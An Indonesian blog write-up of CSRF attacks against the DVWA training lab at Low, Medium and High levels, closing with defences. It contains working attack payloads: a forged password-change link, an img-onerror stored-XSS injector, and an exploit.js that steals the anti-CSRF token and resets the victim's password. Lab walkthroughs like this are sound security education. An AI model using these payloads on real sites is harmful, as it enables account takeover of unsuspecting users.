## Tentang CSRF

**Cross-Site Request Forgery (CSRF)** adalah serangan yang memaksa pengguna yang telah terautentikasi untuk menjalankan aksi yang tidak diinginkan pada aplikasi web. Penyerang mengeksploitasi kepercayaan antara browser pengguna dan situs web yang sah untuk menjalankan perintah atas nama pengguna, tanpa sepengetahuan atau persetujuan mereka.

Kerentanan CSRF terjadi karena aplikasi web menaruh kepercayaan penuh pada browser yang secara otomatis menyertakan kredensial pengguna (seperti session cookie) dalam setiap permintaan, tanpa adanya validasi tambahan seperti CSRF token atau verifikasi asal (origin). Celah ini membuat server tidak mampu membedakan apakah sebuah tindakan benar-benar diinginkan pengguna atau dipicu oleh jebakan situs lain, terutama jika aplikasi menggunakan metode GET untuk transaksi penting, sehingga server tetap memproses permintaan jahat tersebut karena menganggapnya sah.

## Percobaan Serangan CSRF di DVWA

Di DVWA disediakan modul untuk mencoba serangan CSRF di mana di dalam modul tersebut sudah terdapat program yang rentan. Modul tersebut memiliki tampilan berupa form untuk mengganti password user seperti di bawah:

### Level Low

Untuk level low, jika dilihat dari kodenya tidak ada proteksi sama sekali. Ditambah lagi dengan penggunaan metode GET, di mana data sensitif dikirimkan secara terbuka sebagai parameter di dalam URL. Setiap link atau parameter yang dikirim akan langsung dieksekusi oleh server.

```php
if( isset( $_GET[ 'Change' ] ) ) {
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];
    
    if( $pass_new == $pass_conf ) {
        // Update password
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
    }
}
```

![gambar_csrf](/assets/image/2026-02-08-csrf/image4.png)

Contoh serangan dilakukan dari alamat/domain yang berbeda (redirect). Saya telah menyiapkan web super sederhana seperti berikut yang saya jalankan melalui VSCode pada port 5500:

```html
<a href="http://localhost:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
  Click for Free Prize! 
</a>
```

![gambar_csrf](/assets/image/2026-02-08-csrf/image5.png)

Saat diklik, link tersebut akan mengarahkan korban ke halaman CSRF DVWA dan secara otomatis mengganti password menjadi "hacked".

![gambar_csrf](/assets/image/2026-02-08-csrf/image6.png)

### Level Medium

Untuk level medium, sudah ditambahkan proteksi berupa **Referer Check** yang memeriksa apakah request berasal dari domain yang sama atau tidak.

```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
    // Process password change
}
```

Jika kita mengklik link dari web buatan sebelumnya, request akan ditolak karena referer tidak berasal dari domain yang sama.

![gambar_csrf](/assets/image/2026-02-08-csrf/image7.png)

Namun, proteksi ini masih bisa di-bypass dengan memanfaatkan kerentanan **XSS Stored** agar script yang diinjeksikan ke web dapat berinteraksi dengan pengguna target. Percobaan dilakukan dengan menginjeksikan script yang memunculkan link info hadiah.

([Cara XSS Stored](https://aemull.github.io/posts/XSS_Stored/))

```html
<a href="http://localhost:4280/vulnerabilities/csrf/?password_new=hacked-euy&password_conf=hacked-euy&Change=Change">
Click for Free Prize!
</a>
```

![gambar_csrf](/assets/image/2026-02-08-csrf/image2.png)

Link di atas akan mengirim payload password baru ke server. Saat korban mengklik link tersebut, browser akan secara otomatis redirect ke halaman CSRF dan mengganti password.

![gambar_csrf](/assets/image/2026-02-08-csrf/image3.png)

Untuk memverifikasi keberhasilan, logout dan login kembali dengan password lama akan gagal.

### Level High

Pada level high, sudah ditambahkan **Anti-CSRF Token** yang menghasilkan token unik untuk setiap sesi. Token di-generate dengan `generateSessionToken()` dan divalidasi dengan `checkToken()`.

```php
// Check Anti-CSRF token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

Namun, token sesi disimpan di halaman HTML, sehingga masih dapat diambil menggunakan JavaScript. Contoh source HTML:

```html
<input type="hidden" name="user_token" value="bffa61687e3767893c0d37fecd1f8b78">
```

![gambar_csrf](/assets/image/2026-02-08-csrf/image9.png)

Solusi untuk mengatasi proteksi ini adalah dengan menggabungkan beberapa serangan:
- **File Upload** → Mengunggah file JavaScript berbahaya.
- **XSS Stored** → Menginjeksikan script yang memuat file yang diunggah.
- **CSRF** → JavaScript mem-bypass anti-CSRF token.

Alur serangan:
1. Pengguna membuka halaman XSS Stored (Guestbook).
2. Browser memuat dan mengeksekusi exploit.js.
3. JavaScript mengambil halaman CSRF GET `/vulnerabilities/csrf/`.
4. HTML response di-parse untuk mengekstrak user_token.
5. Setelah token didapat, mengirimkan payload untuk mengubah password.
6. Validasi referer dan anti-CSRF token berhasil dilewati, password berhasil diganti.

Pertama, buat file `exploit.js` untuk mengambil token dan mengirimkan permintaan perubahan password:

```javascript
fetch('/vulnerabilities/csrf/')
  .then(r => r.text())
  .then(h => {
    var div = document.createElement('div');
    div.innerHTML = h;
    var token = div.querySelector('input[name=user_token]').value;
    
    console.log('Token extracted:', token);
    
    fetch('/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change&user_token=' + token)
      .then(() => console.log('Password changed!'));
  })
  .catch(e => console.error('Error:', e));
```

Unggah file tersebut di modul File Upload (level low untuk kemudahan).

![gambar_csrf](/assets/image/2026-02-08-csrf/image10.png)

Selanjutnya, lakukan injeksi script di modul XSS Stored agar saat pengguna membuka halaman, script dieksekusi:

```html
<img src=x onerror=document.body.appendChild(document.createElement('script')).src='/hackable/uploads/exploit.js'>
```

![gambar_csrf](/assets/image/2026-02-08-csrf/image11.png)

Setelah itu, kembalikan level CSRF ke High. Saat pengguna membuka halaman XSS Stored, script akan dieksekusi dan mengganti password tanpa sepengetahuan pengguna. Satu-satunya cara untuk mengetahui proses CSRF adalah dengan melihat console log.

![gambar_csrf](/assets/image/2026-02-08-csrf/image12.png)

Untuk pengujian, logout dan coba login dengan password lama.

1. **Anti-CSRF Token** untuk validasi token yang ketat setiap session nya.

    ```php

    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    ```

2. Menambahkan input **Password Saat Ini** pengguna sebelum mengubah password.

    ```php
        // Get input
    $pass_curr = $_GET[ 'password_current' ];
    $pass_new  = $_GET[ 'password_new' ];
    ```

Dengan perlindungan ini, serangan CSRF praktis tidak mungkin dilakukan karena:
- Penyerang tidak dapat mengetahui password saat ini dari korban.
- Token CSRF unik dan hanya valid untuk sesi tertentu.
- Penggunaan prepared statements mencegah eksploitasi tambahan seperti SQL injection.

## Kesimpulan

CSRF adalah serangan berbahaya yang memanfaatkan kepercayaan antara browser dan server. DVWA menunjukkan evolusi perlindungan CSRF dari level Low hingga Impossible. Solusi terbaik untuk mencegah CSRF adalah:
1. Menggunakan **anti-CSRF tokens** yang unik untuk setiap sesi.
2. Memvalidasi **referer header** (meski tidak sepenuhnya aman).
3. Menerapkan **konfirmasi tambahan** seperti password saat ini untuk aksi sensitif.
4. Menggunakan **SameSite cookies** untuk membatasi pengiriman cookie dalam konteks lintas situs.
